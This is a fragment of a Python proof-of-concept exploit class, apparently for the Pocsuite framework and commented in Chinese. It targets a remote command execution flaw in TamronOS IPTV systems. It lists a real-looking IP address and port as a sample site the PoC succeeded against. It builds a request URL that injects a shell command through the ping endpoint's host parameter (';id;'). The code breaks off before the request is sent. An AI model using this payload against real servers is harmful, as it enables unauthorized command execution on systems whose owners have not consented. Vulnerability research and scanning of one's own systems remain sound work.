...
class TemronOS(POCBase):
    ...
    name = "TamronOS IPTV系统远程命令执行POC"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "TamronOS IPTV系统远程命令执行漏洞"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://119.182.17.51:81"]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
        """  # 漏洞简要描述
    pocDesc = """
            TamronOS IPTV系统存在远程命令执行漏洞，攻击者通过发送特定的请求包可以获取服务器权限
        """  # POC用法描述

    # 漏洞检测方法
    def _check(self):
        result = []
        url1 = f"{self.url}/api/ping?count=5&host=;id;"
        headers = {
